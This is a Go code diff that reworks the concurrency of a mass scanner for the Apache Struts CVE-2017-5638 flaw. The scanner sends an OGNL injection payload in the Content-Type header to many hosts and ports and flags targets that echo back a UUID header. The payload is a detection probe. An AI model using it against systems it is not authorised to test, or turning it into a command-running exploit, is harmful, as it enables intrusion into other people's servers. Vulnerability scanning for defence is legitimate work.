@@ -45,10 +45,22 @@ func main() {
 	logrus.Debugf("Ports  : %d", len(args.ports))
 	target := make(chan string)
 
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr,
+		Timeout: time.Duration(args.timeout) * time.Second}
+
+	go makeTarget(targets, args.ports, target)
 	var wg sync.WaitGroup
-	go check(target, &wg, args.concurrency, args.timeout)
-	makeTarget(targets, args.ports, target)
+	for i := 0; i < args.concurrency; i++ {
+		wg.Add(1)
+		go check(target, &wg, client)
+	}
+
 	wg.Wait()
+	// Wait for the last result
+	//time.Sleep(time.Duration(args.timeout+3) * time.Second)
 }
 
 func loadFile(file string) []string {
@@ -68,10 +80,9 @@ func loadFile(file string) []string {
 }
 
 func makeTarget(hosts []string, ports []int, targets chan<- string) {
-	count := 0
 	defer close(targets)
+	count := 0
 	for _, host := range hosts {
-
 		for _, port := range ports {
 			prefix := "http://"
 			inlinePort := ""
@@ -90,43 +101,28 @@ func makeTarget(hosts []string, ports []int, targets chan<- string) {
 	logrus.Infof("Done making %d targets.", count)
 }
 
-func check(targets <-chan string, externalWg *sync.WaitGroup, concurrency int, timeout int) {
+func check(targets <-chan string, wg *sync.WaitGroup, client *http.Client) {
+	defer wg.Done()
+	for target := range targets {
+		logrus.WithField("target", target).Debugf("Checking new target")
+		// https://svn.nmap.org/nmap/scripts/http-vuln-cve2017-5638.nse
+		uuid := uuid.NewV4().String()
+		payload := fmt.Sprintf("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", uuid)
+		req, err := http.NewRequest("GET", target, nil)
+		req.Header.Add("Content-Type", payload)
+		res, err := client.Do(req)
+		if err != nil {
+			logrus.Debugf("Error making request: %s", err.Error())
+			continue
+		} else {
+			defer res.Body.Close()
+		}
 
-	// Do not verify certificates. SANs error abound.
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		vuln := res.Header.Get("X-Check-Struts")
+		if vuln == uuid {
+			logrus.WithField("target", target).Warnf("CVE-2017-5638 vulnerability found!")
+		} else {
+			logrus.WithField("target", target).Debugf("Target not vulnerable")
+		}
 	}
-	externalWg.Add(1)
-	var wg sync.WaitGroup
-	for i := 0; i < concurrency; i++ {
-		wg.Add(1)
-		go func(wg *sync.WaitGroup) {
-			defer wg.Done()
-			for target := range targets {
-				logrus.WithField("target", target).Debugf("Checking new target")
-				// https://svn.nmap.org/nmap/scripts/http-vuln-cve2017-5638.nse
-				uuid := uuid.NewV4().String()
-				payload := fmt.Sprintf("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", uuid)
-				client := &http.Client{Transport: tr,
-					Timeout: time.Duration(timeout) * time.Second}
-				req, err := http.NewRequest("GET", target, nil)
-				req.Header.Add("Content-Type", payload)
-				res, err := client.Do(req)
-				if err != nil {
-					logrus.Debugf("Error making request: %s", err.Error())
-					continue
-				} else {
-					defer res.Body.Close()
-				}
-
-				vuln := res.Header.Get("X-Check-Struts")
-				if vuln == uuid {
-					logrus.WithField("target", target).Warnf("CVE-2017-5638 vulnerability found!")
-				}
-
-			}
-		}(&wg)
-		wg.Wait()
-	}
-	externalWg.Done()
 }
